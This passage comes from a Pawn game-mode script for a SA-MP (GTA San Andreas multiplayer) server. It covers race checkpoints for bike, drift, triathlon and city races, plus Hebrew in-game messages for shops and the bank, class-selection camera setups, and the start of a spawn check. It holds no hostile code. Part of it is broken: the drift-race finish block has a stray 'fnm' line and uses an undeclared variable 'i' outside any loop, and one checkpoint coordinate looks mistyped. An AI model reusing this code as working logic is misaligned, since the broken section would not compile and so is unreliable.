SetPlayerRaceCheckpoint(playerid,0,-2677.4780,1468.2661,55.7398,-2675.6624,1524.2050,59.5215,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 2)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2675.6624,1524.2050,59.5215,-2674.2571,1621.2911,64.7728,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 3)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2674.2571,1621.2911,64.7728,-2674.2271,1731.3424,67.5025,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 4)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2674.2271,1731.3424,67.5025,-2674.8206,1817.2054,67.2536,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 5)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2674.8206,1817.2054,67.2536,-2675.5388,1939.2423,63.3668,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 6)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2675.5388,1939.2423,63.3668,-2675.8511,2011.2689,59.0786,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 7)
{

DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2675.8511,2011.2689,59.0786,-2675.9832,2059.4092,55.4103,15);
InBike[playerid]++;
return 1;
}

else if(InBike[playerid] == 8)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2676.0757,2105.1526,54.9885,-2693.4448,2248.6182,54.9966,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 9)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,1,-2769.5347,2377.8750,78.9515,-2676.7561,2662.0676,83.9215,15);
InBike[playerid]++;
return 1;
}
else if(InBike[playerid] == 10)
{
if (BikeWinner == 1)
{
InBike[playerid] = 0;
LACY_GiveMoney(playerid, 3000);
DisablePlayerRaceCheckpoint(playerid);
BikeWinner = 0;
SetPlayerVirtualWorld(playerid,0);
new vehicleisasadsss = GetPlayerVehicleID(playerid);
SetVehicleVirtualWorld(vehicleisasadsss,0);
SendClientMessageToAll(WHITE,"[________ גאטר מירוצים - אופנועים ________]");
format(fuxm, sizeof(fuxm), ".$3000 ניצח בקרב המירוצים, זכה בסכום כספי של כ,%s",GetName(playerid)),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");
BikeOn = 0;
BikePlayers = 0;

for(new i=0; i<MAX_PLAYERS; i++)
{
if(InBike[i] > 0)
{
SendClientMessage(i, WHITE, ".הפסדת במירוץ, לא נורא נסה פעם הבאה.");
InBike[i] = 0;
DisablePlayerRaceCheckpoint(i);
BikePlayers = 0;
SetPlayerVirtualWorld(i,0);
new vehicleidsss = GetPlayerVehicleID(i);
SetVehicleVirtualWorld(vehicleidsss,0);
}
}
}
return 1;
}
}

if(IfInvite[playerid] ==1)
{
PrivateCP[playerid] ++;
DisablePlayerRaceCheckpoint(playerid);
if(PrivateCP[playerid]==1)return SetPlayerRaceCheckpoint(playerid, 0,2312.2458,1393.8901,36.4219,2321.1826,1408.7799,36.0532, 5);//CP2
if(PrivateCP[playerid]==2)return SetPlayerRaceCheckpoint(playerid, 0,2310.5210,1395.5568,36.4219,2324.8337,1410.8749,35.9194, 5);//CP2
if(PrivateCP[playerid]==3)return SetPlayerRaceCheckpoint(playerid, 0,2302.2295,1511.3616,30.0234,2291.2278,1496.8656,29.6107, 5);//CP2
if(PrivateCP[playerid]==4)return SetPlayerRaceCheckpoint(playerid, 0,2309.6648,1393.4619,23.6250,2324.4387,1411.8712,23.0698, 5);//CP2
if(PrivateCP[playerid]==5)return SetPlayerRaceCheckpoint(playerid, 0,2303.2397,1515.3274,17.2188,291.1782,1494.2946,16.6528, 5);//CP2
if(PrivateCP[playerid]==6)return SetPlayerRaceCheckpoint(playerid, 0,2301.6990,1396.7899,10.8203,2303.4624,1403.7401,10.8234, 5);//CP2
if(PrivateCP[playerid]==7)return SetPlayerRaceCheckpoint(playerid, 1,2310.2561,1536.0842,10.7702,2310.2561,1536.0842,10.7702, 10);//CP2
if(PrivateCP[playerid]==8)
{
LACY_GiveMoney(playerid,driftwinner[playerid]);
format(string,sizeof(string),".ניצח במקום הראשון בדריפט האישי בהצלחה %s",GetName(playerid));
SendClientMessageToAll(COLOR_LIGHTGREEN,string);

fnm
driftwinner[playerid] = 0;
indrift[playerid] =0;
DriftNoNow =0;
PrivateCP[playerid] = 0;
indrift[playerid] = 0;
driftwinner[i] = 0;
indrift[i] =0;
DriftNoNow =0;
PrivateCP[i] = 0;
indrift[i] = 0;
driftwinner[i] = 0;
DriftNoNow =0;
PrivateCP[i] = 0;
DisablePlayerRaceCheckpoint(i);
DriftInvite[i] = 0;
IfInvite[i] = 0;
}
}
return 1;
}

if(Registertrs[playerid] ==1) {
CPTriatlon[playerid] ++;
DisablePlayerRaceCheckpoint(playerid);

if(CPTriatlon[playerid] ==1)return SetPlayerRaceCheckpoint(playerid, 2,835.1030,-1946.7028,12.8672,835.1030,-1946.7028,12.8672, 5);//CP2
if(CPTriatlon[playerid] ==2)return SetPlayerRaceCheckpoint(playerid, 2,833.6904,-2014.0111,12.8672,833.6904,-2014.0111,12.8672, 5);//CP2
if(CPTriatlon[playerid] ==3)return SetPlayerRaceCheckpoint(playerid, 2,831.7608,-2063.9585,12.8672,831.7608,-2063.9585,12.8672, 5);//CP2
if(CPTriatlon[playerid] ==4)return SetPlayerRaceCheckpoint(playerid, 2,857.6528,-2084.8320,-0.6280,857.6528,-2084.8320,-0.6280, 5);//CP2
if(CPTriatlon[playerid] ==5)return SetPlayerRaceCheckpoint(playerid, 2,927.9724,-2082.9536,-0.2570,927.9724,-2082.9536,-0.2570, 5);//CP2
if(CPTriatlon[playerid] ==6)return SetPlayerRaceCheckpoint(playerid, 0,960.0362,-2080.8357,-0.1365,973.6129,-2092.9893,2.8635, 10);//CP2
if(CPTriatlon[playerid] ==7)return SetPlayerRaceCheckpoint(playerid, 2,991.8358,-2062.1714,7.6466,991.8358,-2062.1714,7.6466, 10);//CP2
if(CPTriatlon[playerid] ==8)return SetPlayerRaceCheckpoint(playerid, 2,1001.4911,-2001.1880,8.5669,1001.4911,-2001.1880,8.5669, 10);//CP2
if(CPTriatlon[playerid] ==9)return SetPlayerRaceCheckpoint(playerid, 2,993.5122,-1916.3848,9.7964,993.5122,-1916.3848,9.7964, 10);//CP2
if(CPTriatlon[playerid] ==10)return SetPlayerRaceCheckpoint(playerid, 2,970.5153,-1872.8357,10.0554,970.5153,-1872.8357,10.0554, 10);//CP2
if(CPTriatlon[playerid] ==11)return SetPlayerRaceCheckpoint(playerid, 2,878.6158,-1858.0662,9.1395,878.6158,-1858.0662,9.1395, 10);//CP2
if(CPTriatlon[playerid] ==12)return SetPlayerRaceCheckpoint(playerid, 1,759.9984,-1872.1085,3.7428,759.9984,-1872.1085,3.7428, 10);//CP2

if(CPTriatlon[playerid] ==13){
SendClientMessage(playerid,COLOR_ORANGE,"!זכית במקום הראשון בתחרות טריאטלון");
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,0);
SetVehicleVirtualWorld(vehicleid,0);
LACY_GiveMoney(playerid,3000);
RunSystemend =0;
RunPlayers=0;
RunSystemon=0;
CPTriatlon[playerid]=0;
SendClientMessageToAll(WHITE,"[________ גאטר מירוצים - טריאטלון ________]");
format(fuxm, sizeof(fuxm), ".$3000 ניצח בקרב המירוצים, זכה בסכום כספי של כ,%s",GetName(playerid)),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");
for(new v = 0; v < 10; v++)
{
SetVehicleToRespawn(triamountion[v]);
}

for(new i=0; i<MAX_PLAYERS; i++)
{
if(Registertrs[i] ==1){
SetPlayerVirtualWorld(i,0);


CPTriatlon[playerid]=0;
DisablePlayerRaceCheckpoint(i);
Registertrs[playerid] =0;
Registertrs[i] =0;
CPTriatlon[i]=0;
RunPlayers=0;
}
}

}
}




if(YouRegister[playerid] ==1)
{
DriftCP[playerid] ++;
DisablePlayerRaceCheckpoint(playerid);

if(DriftCP[playerid]==1)return SetPlayerRaceCheckpoint(playerid, 0,2312.2458,1393.8901,36.4219,2321.1826,1408.7799,36.0532, 5);//CP2
if(DriftCP[playerid]==2)return SetPlayerRaceCheckpoint(playerid, 0,2310.5210,1395.5568,36.4219,2324.8337,1410.8749,35.9194, 5);//CP2
if(DriftCP[playerid]==3)return SetPlayerRaceCheckpoint(playerid, 0,2302.2295,1511.3616,30.0234,2291.2278,1496.8656,29.6107, 5);//CP2
if(DriftCP[playerid]==4)return SetPlayerRaceCheckpoint(playerid, 0,2309.6648,1393.4619,23.6250,2324.4387,1411.8712,23.0698, 5);//CP2
if(DriftCP[playerid]==5)return SetPlayerRaceCheckpoint(playerid, 0,2303.2397,1515.3274,17.2188,291.1782,1494.2946,16.6528, 5);//CP2
if(DriftCP[playerid]==6)return SetPlayerRaceCheckpoint(playerid, 0,2301.6990,1396.7899,10.8203,2303.4624,1403.7401,10.8234, 5);//CP2
if(DriftCP[playerid]==7)return SetPlayerRaceCheckpoint(playerid, 1,2310.2561,1536.0842,10.7702,2310.2561,1536.0842,10.7702, 10);//CP2
if(DriftCP[playerid]==8){
if(WinnerDrift ==1){
LACY_GiveMoney(playerid,3000);
DriftEnd =0;
WinnerDrift=0;
DriftPlayer=0;
IFDriftOn=0;
DriftCP[playerid]=0;
SendClientMessageToAll(WHITE,"[________ גאטר מירוצים - דריפטים  ________]");
format(fuxm, sizeof(fuxm), ".$3000 ניצח בקרב המירוצים, זכה בסכום כספי של כ,%s",GetName(playerid)),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");

for(new i=0; i<MAX_PLAYERS; i++)
{
if(YouRegister[i] ==1)
{
DisablePlayerRaceCheckpoint(i);
YouRegister[i] =0;
DriftCP[i]=0;
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleid,0);
}
}
}
}
}



if(Youregisterrace[playerid] ==1) {
RaceCP[playerid] ++;
DisablePlayerRaceCheckpoint(playerid);
if(RaceCP[playerid]==1)return SetPlayerRaceCheckpoint(playerid, 2,1654.1509,852.3846,6.7344,1654.1509,852.3846,6.7344, 30);//CP2
if(RaceCP[playerid]==2)return SetPlayerRaceCheckpoint(playerid, 2, 1323.0438,878.1723,6.8125,1321.2013,877.8336,6.8125, 30);//CP3
if(RaceCP[playerid]==3)return SetPlayerRaceCheckpoint(playerid, 2, 1224.8558,1221.3717,6.8125,1224.8558,1221.3717,6.8125, 30);//CP4
if(RaceCP[playerid]==4)return SetPlayerRaceCheckpoint(playerid, 2,1225.2936,1715.2413,6.7344,1225.2936,1715.2413,6.7344, 30);//CP5
if(RaceCP[playerid]==5)return SetPlayerRaceCheckpoint(playerid, 2,1222.9575,2174.5479,6.7344,1222.9575,2174.5479,6.7344, 30);//CP6
if(RaceCP[playerid]==6)return SetPlayerRaceCheckpoint(playerid, 2,1356.5955,2447.2737,6.7344,1356.5955,2447.2737,6.7344, 30);//CP7
if(RaceCP[playerid]==7)return SetPlayerRaceCheckpoint(playerid, 2,1753.1908,2472.9661,6.8281,1753.1908,2472.9661,6.8281, 30);//CP8
if(RaceCP[playerid]==8)return SetPlayerRaceCheckpoint(playerid, 2,2402.0652,2614.9741,6.7396,2402.0652,2614.9741,6.7396, 30);//CP9
if(RaceCP[playerid]==9)return SetPlayerRaceCheckpoint(playerid, 2,2710.1377,2270.5713,6.7422,2710.1377,2270.5713,6.7422, 30);//CP10
if(RaceCP[playerid]==10)return SetPlayerRaceCheckpoint(playerid, 2,2709.1672,1570.4209,6.7420,2709.1672,1570.4209,6.7420, 30);//CP10
if(RaceCP[playerid]==11) return SetPlayerRaceCheckpoint(playerid, 2,2711.4617,1286.2806,6.7420,2711.4617,1286.2806,6.7420, 30);//CP10
if(RaceCP[playerid]==12)return SetPlayerRaceCheckpoint(playerid, 2,2648.1836,952.8601,6.7344,2648.1836,952.8601,6.7344, 30);//CP10
if(RaceCP[playerid]==13)return SetPlayerRaceCheckpoint(playerid, 2,2389.7788,848.4463,6.7420,2389.7788,848.4463,6.7420, 30);//CP10
if(RaceCP[playerid]==14)return SetPlayerRaceCheckpoint(playerid, 1,2105.2747,850.5719,6.8441,2105.2747,850.5719,6.8441, 30);//CP10
if(RaceCP[playerid]==15)
{
if(WinnerRace ==1)
{
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,0);
SetVehicleVirtualWorld(vehicleid,0);
LACY_GiveMoney(playerid,3000);
format(string,sizeof(string),".ניצח במקום הראשון, מחכים למקום השני עכשיו %s",GetName(playerid));
SendClientMessageToAll(COLOR_ORANGE,string);
WinnerRace ++;
RacePlayers --;
if(RacePlayers == 0)
{
SendClientMessageToAll(WHITE,"המירוץ הסתיים בהצלחה, לא היה שחקן שיסיים במקום השני / השלישי אז המערכת בוטלה");
for(new i=0; i<MAX_PLAYERS; i++)
{
if(Youregisterrace[i] ==1)
{
RaceEnd =0;
WinnerRace=0;
RacePlayers=0;
IFraceOn=0;
RaceCP[playerid]=0;
new vehicleida = GetPlayerVehicleID(i);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleida,0);
DisablePlayerRaceCheckpoint(i);
Youregisterrace[i] =0;
RaceCP[i]=0;
}
}
return 1;
}
return 1;
}
if(WinnerRace == 2)
{
if(RacePlayers == 0)
{
SendClientMessageToAll(WHITE,"המירוץ הסתיים בהצלחה, לא היה שחקן שיסיים במקום השני / השלישי אז המערכת בוטלה");
for(new i=0; i<MAX_PLAYERS; i++)
{
if(Youregisterrace[i] ==1)
{
RaceEnd =0;
WinnerRace=0;
RacePlayers=0;
IFraceOn=0;
RaceCP[playerid]=0;
new vehicleida = GetPlayerVehicleID(i);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleida,0);
DisablePlayerRaceCheckpoint(i);
Youregisterrace[i] =0;
RaceCP[i]=0;
}
}
return 1;
}
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,0);
SetVehicleVirtualWorld(vehicleid,0);
LACY_GiveMoney(playerid,10000);
format(string,sizeof(string),".ניצח במקום השני במירוץ, מחכים לשלישי %s",GetName(playerid));
SendClientMessageToAll(COLOR_ORANGE,string);
WinnerRace ++;
RacePlayers --;
return 1;
}
if(WinnerRace == 3)
{
if(RacePlayers == 0)
{
SendClientMessageToAll(WHITE,"המירוץ הסתיים בהצלחה, לא היה שחקן שיסיים במקום השני / השלישי אז המערכת בוטלה");
for(new i=0; i<MAX_PLAYERS; i++)
{
if(Youregisterrace[i] ==1)
{
RaceEnd =0;
WinnerRace=0;
RacePlayers=0;
IFraceOn=0;
RaceCP[playerid]=0;
new vehicleida = GetPlayerVehicleID(i);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleida,0);
DisablePlayerRaceCheckpoint(i);
Youregisterrace[i] =0;
RaceCP[i]=0;
}
}
return 1;
}
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,0);
SetVehicleVirtualWorld(vehicleid,0);
LACY_GiveMoney(playerid,5000);
format(string,sizeof(string),".ניצח במקום השלישי, המירוץ הסתיים %s",GetName(playerid));
SendClientMessageToAll(COLOR_ORANGE,string);
WinnerRace ++;
RacePlayers --;
for(new i=0; i<MAX_PLAYERS; i++)
{
if(Youregisterrace[i] ==1)
{
RaceEnd =0;
WinnerRace=0;
RacePlayers=0;
IFraceOn=0;
RaceCP[playerid]=0;
new vehicleida = GetPlayerVehicleID(i);
SetPlayerVirtualWorld(i,0);
SetVehicleVirtualWorld(vehicleida,0);
DisablePlayerRaceCheckpoint(i);
Youregisterrace[i] =0;
RaceCP[i]=0;
}
}
}
}
}
//=LOS
new str[256];
if(InCityRaceing[playerid] > 0)
{
CityCP[playerid]++;
if(CityCP[playerid] < 29)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,CityCPs[CityCP[playerid]][0],CityCPs[CityCP[playerid]][1],CityCPs[CityCP[playerid]][2],CityCPs[CityCP[playerid]+1][0],CityCPs[CityCP[playerid]+1][1],CityCPs[CityCP[playerid]+1][2],50.0);
}
if(CityCP[playerid] == 29)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,1,-2681.938, 1310.6881, 55.3563,-2681.938, 1310.6881, 55.3563,50.0);
}
if(CityCP[playerid] == 30 && InCityRaceing[playerid] > 0)
{
SendClientMessageToAll(red,"»»~ | Special Race City Winner | »»~");
format(str, sizeof(str), ".$3000 ניצח בקרב המירוצים, זכה בסכום כספי של כ ,%s",GetName(playerid));
SendClientMessageToAll(0x16EB43FF, str);
SendClientMessageToAll(red,"»»~ | נתראה במירוץ הבא | »»~ ");
LACY_GiveMoney(playerid,3000);
for(new i = 0; i < MAX_PLAYERS; i++)
{
CityRaceingOn = 0;
CountCityRaceingr = 0;
CityRaceingPlayers = 0;
CityCP[i] = 0;
if(InCityRaceing[i] > 0)
{
DisablePlayerRaceCheckpoint(i);
SetPlayerVirtualWorld(i,1);
SetVehicleVirtualWorld(GetPlayerVehicleID(i),1);

TogglePlayerControllable(i,1);
InCityRaceing[i] = 0;
}
}
}
}

//LOS SANTOS


if(InCityRaceing2[playerid] == 1)
{
CityCP[playerid]++;
if(CityCP[playerid] < 15)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,CityCPs2[CityCP[playerid]][0],CityCPs2[CityCP[playerid]][1],CityCPs2[CityCP[playerid]][2],CityCPs2[CityCP[playerid]+1][0],CityCPs2[CityCP[playerid]+1][1],CityCPs2[CityCP[playerid]+1][2],50.0);
}
if(CityCP[playerid] == 15)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,1,2887.9311, -1592.2507, 10.7739,2887.9311, -1592.2507, 10.7739,50.0);
}
if(CityCP[playerid] == 16)
{
SendClientMessageToAll(red,"»»~ | Special Race City Winner | »»~");
format(str, sizeof(str), ".$3000 ניצח בקרב המירוצים, זכה בסכום כספי של כ ,%s",GetName(playerid));
SendClientMessageToAll(0x16EB43FF, str);
SendClientMessageToAll(red,"»»~ | נתראה במירוץ הבא | »»~ ");
LACY_GiveMoney(playerid,3000);
for(new i = 0; i < MAX_PLAYERS; i++)
{
CityRaceingOn = 0;
CountCityRaceingr = 0;
CityRaceingPlayers = 0;
CityCP[i] = 0;
if(InCityRaceing2[i] > 0)
{
InCityRaceing2[i] = 0;
DisablePlayerRaceCheckpoint(i);
SetPlayerVirtualWorld(i,1);
TogglePlayerControllable(i,1);
if(IsPlayerInAnyVehicle(i))
{
SetVehicleVirtualWorld(GetPlayerVehicleID(i),1);
}
}
}
}
}
//===
if(InAllMapRaceing[playerid] > 0)
{

AllMapCP[playerid]++;
if(AllMapCP[playerid] < 34)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,AllMapCPs[AllMapCP[playerid]][0],AllMapCPs[AllMapCP[playerid]][1],AllMapCPs[AllMapCP[playerid]][2],AllMapCPs[AllMapCP[playerid]+1][0],AllMapCPs[AllMapCP[playerid]+1][1],AllMapCPs[AllMapCP[playerid]+1][2],30.0);
}

if(AllMapCP[playerid] == 34)
{
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,1,AllMapCPs[AllMapCP[playerid]][0],AllMapCPs[AllMapCP[playerid]][1],AllMapCPs[AllMapCP[playerid]][2],AllMapCPs[AllMapCP[playerid]+1][0],AllMapCPs[AllMapCP[playerid]+1][1],AllMapCPs[AllMapCP[playerid]+1][2],30.0);
}
if(AllMapCP[playerid] == 35)
{
DisablePlayerRaceCheckpoint(playerid);
SendClientMessageToAll(red,"~~~~~ | Special Race AllMap Winner | ~~~~~");
format(str, sizeof(str), ".$3000 ניצח בקרב המירוצים, זכה בסכום כספי של כ ,%s",GetName(playerid));
SendClientMessageToAll(0x16EB43FF, str);
SendClientMessageToAll(red,"~~~~~ | נתראה במירוץ הבא | ~~~~~ ");
LACY_GiveMoney(playerid,3000);
InAllMapRaceing[playerid] = 0;
AllMapCP[playerid] = 0;
for(new i = 0; i < MAX_PLAYERS; i++)
{
AllMapRaceingOn = 0;
CountAllMapRaceingr = 0;
AllMapRaceingPlayers = 0;
InAllMapRaceing[i] = 0;
AllMapCP[i] = 0;
if(InAllMapRaceing[i] > 0)
{
DisablePlayerRaceCheckpoint(i);
SetPlayerVirtualWorld(i,1);
TogglePlayerControllable(i,1);
if(IsPlayerInAnyVehicle(i))
{
SetVehicleVirtualWorld(GetPlayerVehicleID(i),1);
}
}
}
}
}

return 1;
}
public OnPlayerEnterCheckpoint(playerid)
{

if(CPS_IsPlayerInCheckpoint(playerid,bombshop))
{
SendClientMessage(playerid, lblue, "~~~  :Bomb Shop ברוכים הבאים ל ~~~");
SendClientMessage(playerid, COLOR_PINK, ".שלום! כאן תוכל לקנות פצצות ולהשתמש בהם בכל מקום");
SendClientMessage(playerid, COLOR_PURPLE, ":Bomb Shop פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/buybomb(6) /usebomb(6)");
}


if(CPS_IsPlayerInCheckpoint(playerid,AmmunationS3) || CPS_IsPlayerInCheckpoint(playerid,AmmunationS1) || CPS_IsPlayerInCheckpoint(playerid,AmmunationS1))
{
SendClientMessage(playerid, lblue, "~~~  :SAmmunation ברוכים הבאים ל ~~~");
SendClientMessage(playerid, COLOR_PINK, ".כאן תוכל לקנות נשקים מיוחדים, סודיים!, נשקים אשר לא מופיעים במפה הרגילה");
SendClientMessage(playerid, COLOR_PURPLE, ":SAmmunation פקודות ה");
SendClientMessage(playerid, COLOR_YELLOW, "/sbw(2) /swl(2) /sbarmour(4) /sbhealth(6)");
}


if(CPS_IsPlayerInCheckpoint(playerid,be)) return SetPlayerPos(playerid,2144.0793,1612.3879,993.6882),SetPlayerInterior(playerid,1),ResetPlayerWeapons(playerid);
if(CPS_IsPlayerInCheckpoint(playerid,nobank))return SetPlayerPos(playerid,1424.9977,-2285.6335,13.3828),SetPlayerInterior(playerid,0),AtBank[playerid]=0;
if(CPS_IsPlayerInCheckpoint(playerid,Wang))return SellWangExportVehicle(playerid);



if(CPS_IsPlayerInCheckpoint(playerid,bcp))
{
SendClientMessage(playerid, lblue, "~~~ (5 - Bank) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".בבנק תוכל לשמור כסף , גם אחרי שתמות הכסף ישמר");
SendClientMessage(playerid, COLOR_PINK,".יש גם כרטיס אשראי שבוא תוכל להשתמש מחוץ לבנק למשיכת כספים");
SendClientMessage(playerid, COLOR_PINK,"קניית כרטיס אשראי עולה כ700000 | מכירת כרטיס אשראי תחזיר כ350000");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות בנק");
SendClientMessage(playerid, COLOR_YELLOW,"/deposit(1) /depositall /withdraw(1) /withdrawall(1)");
SendClientMessage(playerid, COLOR_YELLOW,"/balance");
SendClientMessage(playerid, COLOR_YELLOW, "/getloan(4) /backloan (4)");
SendClientMessage(playerid, COLOR_PURPLE,":פקודות כרטיס אשראי");
SendClientMessage(playerid, COLOR_YELLOW,"/buycc(3) /sellcc(3) /withdrawc(3)");
if(PlayerInfo[playerid][GetAloan] ==1)
{
new string[256];
format(string, sizeof(string),"* %d :שלום לך , אתה חייב לבנק סכום של",PlayerInfo[playerid][MoneyLoan]),SendClientMessage(playerid,red,string),SendClientMessage(playerid,red,".עם לא תחזיר לא תוכל להשתמש בבנק /backloan להחזרת החוב");
}
}

if(CPS_IsPlayerInCheckpoint(playerid,Pirate))
{
SendClientMessage(playerid, lblue, "~~~ (44 - BSHIP) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK,".שים לב, כל עוד אתה עומד על ספינת הפיראטים, אתה תקבל סכום שנע בין ל-100-200 דולר");
SendClientMessage(playerid, COLOR_PINK,".בנק הספינה רמה: 5 ומעלה");
SendClientMessage(playerid, COLOR_PINK,".בבנק הספינה אתה יכול להפקיד תכסף ישר לבנק מאשר לקבל אותו ליד");
SendClientMessage(playerid, COLOR_PINK,".שים לב, הבנק לוקח ריבית של 50 דולר כל הכנסה, הבנק יתעדכן פעם ב10 שניות");
SendClientMessage(playerid,COLOR_YELLOW,":פקודות בנק ספינת הכסף");
SendClientMessage(playerid,COLOR_YELLOW,"/sbstop(5) /sbship(5)");
}
if(CPS_IsPlayerInCheckpoint(playerid,Ammu)){

SendClientMessage(playerid, lblue, "~~~ (31 - Ammunation) Mode - מוד ~~~");
SendClientMessage(playerid, COLOR_PINK, ".בחנות נשקים תוכל לקנות נשקים אשר יישמרו לך גם אחרי שתמות");
SendClientMessage(playerid, COLOR_PINK, ".במידה ואתה רשום, הנשקים יישמרו לתמיד");
SendClientMessage(playerid, COLOR_PURPLE, ":פקודות נשקים");
SendClientMessage(playerid, COLOR_YELLOW, "/bw(1) /wl(1) /resetw(1) /buyarmour(9)");
}

return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{

	return 1;
}
public OnPlayerRequestClass(playerid, classid)
{
ApplyAnimation(playerid,"DANCING","dnce_M_e",4.0,1,1,1,1,0);
if(camrea[playerid] == 0)
{
SetPlayerInterior(playerid,0);
SetPlayerPos(playerid,-2039.9517,-859.5262,32.1719);
SetPlayerFacingAngle(playerid,88.0834);
SetPlayerCameraPos(playerid,-2044.3922,-859.7228,32.1719);
SetPlayerCameraLookAt(playerid,-2039.9517,-859.5262,32.1719);
}


if(camrea[playerid] == 1)
{
SetPlayerInterior(playerid,0);
SetPlayerPos(playerid,-2039.9517,-859.5262,32.1719);
SetPlayerFacingAngle(playerid,88.0834);
SetPlayerCameraPos(playerid,-2044.3922,-859.7228,32.1719);
SetPlayerCameraLookAt(playerid,-2039.9517,-859.5262,32.1719);
}

else if(camrea[playerid] == 2)
{

SetPlayerInterior(playerid,3);
SetPlayerPos(playerid,945.2175,-58.7206,1001.1172);
SetPlayerFacingAngle(playerid,332.3023);
SetPlayerCameraPos(playerid,946.9453,-55.2329,1001.1246);
SetPlayerCameraLookAt(playerid,945.2175,-58.7206,1001.1172);
}

else if(camrea[playerid] == 3)
{
SetPlayerInterior(playerid,3);
SetPlayerPos(playerid,944.9008,-42.9975,1001.7672);
SetPlayerFacingAngle(playerid,185.1793);
SetPlayerCameraPos(playerid,944.9080,-47.1433,1001.1166);
SetPlayerCameraLookAt(playerid,944.9008,-42.9975,1001.7672);
}


else if(camrea[playerid] == 4)
{
SetPlayerInterior(playerid,3);
SetPlayerPos(playerid,951.3958,-45.5396,1001.1172);
SetPlayerFacingAngle(playerid,206.9679);
SetPlayerCameraPos(playerid,954.8068,-47.8641,1002.9493);
SetPlayerCameraLookAt(playerid,951.3958,-45.5396,1001.1172);
}

else if(camrea[playerid] == 5)
{
SetPlayerInterior(playerid,3);
SetPlayerPos(playerid,952.8688,-56.9905,1001.1172);
SetPlayerFacingAngle(playerid,7.6860);
SetPlayerCameraPos(playerid,949.6302,-53.2063,1002.8500);
SetPlayerCameraLookAt(playerid,952.8688,-56.9905,1001.1172);
}

else if(camrea[playerid] == 6)
{
SetPlayerInterior(playerid,2);
SetPlayerPos(playerid,619.8841,-75.5772,997.9922);
SetPlayerFacingAngle(playerid,62.5921);
SetPlayerCameraPos(playerid,609.8168,-71.4423,997.9922);
SetPlayerCameraLookAt(playerid,619.8841,-75.5772,997.9922);
}

else if(camrea[playerid] == 7)
{
SetPlayerInterior(playerid,1);
SetPlayerPos(playerid,446.3866,-10.4707,1000.7344);
SetPlayerFacingAngle(playerid,358.6222);
SetPlayerCameraPos(playerid,446.0478,-6.5299,1000.7344);
SetPlayerCameraLookAt(playerid,446.3866,-10.4707,1000.7344);
}

else if(camrea[playerid] == 8)
{

SetPlayerInterior(playerid,1);
SetPlayerPos(playerid,247.0246,301.8773,999.1484);
SetPlayerFacingAngle(playerid,356.3022);
SetPlayerCameraPos(playerid,247.0310,306.0498,999.1484);
SetPlayerCameraLookAt(playerid,247.0246,301.8773,999.1484);
}

else if(camrea[playerid] == 9)
{

SetPlayerInterior(playerid,2);
SetPlayerPos(playerid,2454.3113,-1703.4824,1013.5078);
SetPlayerFacingAngle(playerid,80.3415);
SetPlayerCameraPos(playerid,2452.5771,-1703.7039,1013.5078);
SetPlayerCameraLookAt(playerid,2454.3113,-1703.4824,1013.5078);
}

else if(camrea[playerid] == 10)
{

SetPlayerInterior(playerid,1);
SetPlayerPos(playerid,681.7135,-455.5978,-25.6099);
SetPlayerFacingAngle(playerid,354.7945);
SetPlayerCameraPos(playerid,681.2271,-451.4375,-25.6099);
SetPlayerCameraLookAt(playerid,681.7135,-455.5978,-25.6099);
}







if(classid == 25 || classid == 41 ||  classid == 125 || classid == 122 || classid == 123 || classid == 102 ||  classid == 103 || classid == 42 ||  classid == 106 ||  classid == 105 || classid == 43 || classid == 44 || classid == 45 || classid == 46)
{
iSpawnSet[playerid] = 1;
}
else
{
iSpawnSet[playerid] = 0;
}
return 1;
}


public OnPlayerRequestSpawn(playerid) {

new str[256];
if(PlayerInfo[playerid][Logged] > 1) return 0;
if(!dini_Exists(GetPlayerFile(playerid))) return format(str, sizeof(str), "/register :על מנת להתחיל לשחק הירשם קודם"), SendClientMessage(playerid, red , str),0;
